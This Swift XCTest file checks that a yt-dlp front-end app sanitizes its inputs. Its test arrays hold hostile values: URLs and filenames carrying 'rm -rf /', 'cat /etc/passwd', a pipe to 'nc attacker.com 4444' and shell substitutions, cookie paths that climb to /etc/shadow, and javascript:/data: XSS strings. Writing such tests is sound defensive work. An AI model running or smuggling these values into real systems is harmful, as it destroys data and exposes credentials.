//
//  SecurityTests.swift
//  yt-dlp-MAXTests
//
//  Security tests for input validation and injection prevention
//

import XCTest
@testable import yt_dlp_MAX

class SecurityTests: XCTestCase {
    
    var ytdlpService: YTDLPService!
    
    override func setUp() {
        super.setUp()
        ytdlpService = YTDLPService()
    }
    
    override func tearDown() {
        ytdlpService = nil
        super.tearDown()
    }
    
    // MARK: - Command Injection Tests
    
    func testCommandInjectionInURL() {
        // Test URLs with shell special characters that could cause command injection
        let maliciousURLs = [
            "https://example.com/video; rm -rf /",
            "https://example.com/video && cat /etc/passwd",
            "https://example.com/video | nc attacker.com 4444",
            "https://example.com/video`whoami`",
            "https://example.com/video$(echo hacked)",
            "https://example.com/video' && echo 'injected",
            "https://example.com/video\" && echo \"injected",
            "https://example.com/video\nrm -rf /",
            "https://example.com/video\r\ncat /etc/passwd"
        ]
        
        for url in maliciousURLs {
            // The sanitizeURL method should remove or escape dangerous characters
            let expectation = XCTestExpectation(description: "Process completes without injection")
            
            Task {
                do {
                    // Attempt to fetch metadata with malicious URL
                    let _ = try await ytdlpService.fetchVideoInfo(url: url)
                    // If we get here, the URL was either sanitized or rejected
                    expectation.fulfill()
                } catch {
                    // Expected to fail with invalid URL
                    if case YTDLPError.processFailed(let message) = error,
                       message.contains("Invalid URL") {
                        expectation.fulfill()
                    } else {
                        XCTFail("Unexpected error: \(error)")
                    }
                }
            }
            
            wait(for: [expectation], timeout: 5.0)
        }
    }
    
    func testPathTraversalInCookieFile() {
        // Test cookie file paths that attempt path traversal
        let maliciousPaths = [
            "../../../etc/passwd",
            "../../../../../../etc/shadow",
            "/etc/passwd",
            "~/../../etc/passwd",
            "cookies.txt/../../../etc/passwd",
            "cookies.txt/../../sensitive_file",
            "cookies.txt; cat /etc/passwd"
        ]
        
        for path in maliciousPaths {
            // Store malicious path in UserDefaults
            UserDefaults.standard.set(path, forKey: "cookieFilePath")
            
            let expectation = XCTestExpectation(description: "Cookie path is sanitized")
            
            Task {
                do {
                    // Attempt to use the cookie file in download
                    let testURL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
                    let _ = try await ytdlpService.fetchVideoInfo(url: testURL)
                    // Path should be sanitized - no path traversal should occur
                    expectation.fulfill()
                } catch {
                    // This is also acceptable - invalid path rejected
                    expectation.fulfill()
                }
            }
            
            wait(for: [expectation], timeout: 5.0)
        }
        
        // Clean up
        UserDefaults.standard.removeObject(forKey: "cookieFilePath")
    }
    
    func testFilenameInjection() {
        // Test filenames that could cause issues
        let maliciousFilenames = [
            "video; rm -rf /",
            "../../../etc/passwd",
            "video\0.mp4",
            "video|nc attacker.com",
            "video`whoami`.mp4",
            "video$(uname -a).mp4",
            "con.mp4", // Windows reserved name
            "aux.mp4", // Windows reserved name
            String(repeating: "a", count: 300) + ".mp4" // Very long filename
        ]
        
        for filename in maliciousFilenames {
            // Create mock download task
            let task = QueueItem(
                url: "https://example.com/video",
                format: nil,
                videoInfo: VideoInfo(
                    id: "test123",
                    title: filename, // Malicious filename in title
                    thumbnail: nil,
                    description: nil,
                    uploader: nil,
                    duration: nil,
                    view_count: nil,
                    upload_date: nil,
                    formats: nil,
                    thumbnails: nil,
                    playlist_count: nil,
                    playlist_index: nil,
                    playlist_title: nil
                ),
                downloadLocation: URL(fileURLWithPath: "/tmp")
            )
            
            // The service should sanitize the filename
            let expectation = XCTestExpectation(description: "Filename is sanitized")
            
            Task {
                do {
                    try await ytdlpService.downloadVideo(
                        url: task.url,
                        format: task.format,
                        outputPath: "/tmp/test",
                        downloadTask: task
                    )
                    expectation.fulfill()
                } catch {
                    // Download might fail, but should not execute injected commands
                    expectation.fulfill()
                }
            }
            
            wait(for: [expectation], timeout: 5.0)
        }
    }
    
    // MARK: - URL Validation Tests
    
    func testURLValidation() {
        let validURLs = [
            "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
            "http://example.com/video.mp4",
            "https://vimeo.com/123456789",
            "ftp://ftp.example.com/video.mp4"
        ]
        
        let invalidURLs = [
            "javascript:alert('xss')",
            "file:///etc/passwd",
            "data:text/html,<script>alert('xss')</script>",
            "about:blank",
            "chrome://settings",
            "not a url at all",
            ""
        ]
        
        // Test valid URLs should pass
        for url in validURLs {
            let expectation = XCTestExpectation(description: "Valid URL accepted")
            
            Task {
                do {
                    let _ = try await ytdlpService.fetchVideoInfo(url: url)
                    expectation.fulfill()
                } catch {
                    // May fail due to network, but shouldn't be rejected as invalid
                    if case YTDLPError.processFailed(let message) = error,
                       !message.contains("Invalid URL") {
                        expectation.fulfill()
                    }
                }
            }
            
            wait(for: [expectation], timeout: 5.0)
        }
        
        // Test invalid URLs should be rejected
        for url in invalidURLs {
            let expectation = XCTestExpectation(description: "Invalid URL rejected")
            
            Task {
                do {
                    let _ = try await ytdlpService.fetchVideoInfo(url: url)
                    XCTFail("Should have rejected invalid URL: \(url)")
                } catch {
                    if case YTDLPError.processFailed(let message) = error,
                       message.contains("Invalid URL") {
                        expectation.fulfill()
                    }
                }
            }
            
            wait(for: [expectation], timeout: 5.0)
        }
    }
    
    // MARK: - Process Management Tests
    
    func testProcessManagerThreadSafety() {
        let processManager = ProcessManager.shared
        let iterations = 100
        let expectation = XCTestExpectation(description: "Concurrent operations complete")
        expectation.expectedFulfillmentCount = iterations * 2
        
        // Simulate concurrent register/unregister operations
        DispatchQueue.concurrentPerform(iterations: iterations) { index in
            let process = Process()
            process.executableURL = URL(fileURLWithPath: "/bin/echo")
            process.arguments = ["test\(index)"]
            
            // Register
            Task {
                await processManager.register(process)
                expectation.fulfill()
            }
            
            // Unregister after a small delay
            DispatchQueue.global().asyncAfter(deadline: .now() + 0.01) {
                Task {
                    await processManager.unregister(process)
                    expectation.fulfill()
                }
            }
        }
        
        wait(for: [expectation], timeout: 10.0)
        
        // Verify no processes leaked
        Task {
            let count = await processManager.activeCount
            XCTAssertEqual(count, 0, "All processes should be unregistered")
        }
    }
    
    // MARK: - Memory Management Tests
    
    func testDownloadQueueMemoryManagement() {
        let queue = DownloadQueue()
        let itemCount = 50
        
        // Add many items
        for i in 0..<itemCount {
            let videoInfo = VideoInfo(
                id: "test\(i)",
                title: "Test Video \(i)",
                thumbnail: nil,
                description: nil,
                uploader: nil,
                duration: nil,
                view_count: nil,
                upload_date: nil,
                formats: nil,
                thumbnails: nil,
                playlist_count: nil,
                playlist_index: nil,
                playlist_title: nil
            )
            
            queue.addToQueue(
                url: "https://example.com/video\(i)",
                format: nil,
                videoInfo: videoInfo
            )
        }
        
        XCTAssertEqual(queue.items.count, itemCount)
        
        // Remove half of them
        for _ in 0..<(itemCount / 2) {
            if let firstItem = queue.items.first {
                queue.removeFromQueue(firstItem)
            }
        }
        
        XCTAssertEqual(queue.items.count, itemCount / 2)
        
        // Clear remaining
        queue.clearCompleted()
        
        // Force deinit to test cleanup
        // The deinit should clean up all subscriptions without crashes
    }
    
    // MARK: - Performance Tests
    
    func testSanitizationPerformance() {
        // Measure performance of sanitization methods
        measure {
            let service = YTDLPService()
            
            // Test URL sanitization
            for _ in 0..<1000 {
                _ = service.performSelector(
                    Selector(("sanitizeURL:")),
                    with: "https://example.com/video?param=value&other=test"
                )
            }
            
            // Test filename sanitization
            for _ in 0..<1000 {
                _ = service.performSelector(
                    Selector(("sanitizeFilename:")),
                    with: "My Video Title (Official Music Video) [HD] - 2024.mp4"
                )
            }
            
            // Test path sanitization
            for _ in 0..<1000 {
                _ = service.performSelector(
                    Selector(("sanitizeFilePath:")),
                    with: "/Users/test/Downloads/videos/file.mp4"
                )
            }
        }
    }
}